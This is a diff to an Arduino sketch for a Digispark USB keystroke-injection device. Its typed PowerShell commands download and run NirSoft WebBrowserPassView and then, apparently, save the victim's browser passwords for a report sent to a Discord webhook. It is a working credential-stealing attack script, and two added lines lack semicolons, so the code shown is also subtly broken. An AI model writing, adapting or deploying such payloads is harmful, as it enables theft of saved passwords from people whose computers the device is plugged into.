@@ -17,15 +17,9 @@ void loop() {
     DigiKeyboard.print("$webhook='%DISCORD_WEBHOOK%'");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
-    DigiKeyboard.print("mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip");
+    DigiKeyboard.print("mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip * -p"wbpv28821@"; .\WebBrowserPassView.exe");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(20000);
-    DigiKeyboard.print("wbpv28821@");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(500);
-    DigiKeyboard.print(".\WebBrowserPassView.exe");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(8000);
+    DigiKeyboard.delay(5000);
     DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_A);
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_S);
@@ -37,7 +31,9 @@ void loop() {
     DigiKeyboard.sendKeyStroke(KEY_DOWN);
     DigiKeyboard.sendKeyStroke(KEY_DOWN);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(2000);
+    DigiKeyboard.delay(3000);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER)
+    DigiKeyboard.sendKeyStroke(KEY_ENTER)
     DigiKeyboard.print("$content='Digispark Report'; $payload=[PSCustomObject]@{ content=$content };");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(750);
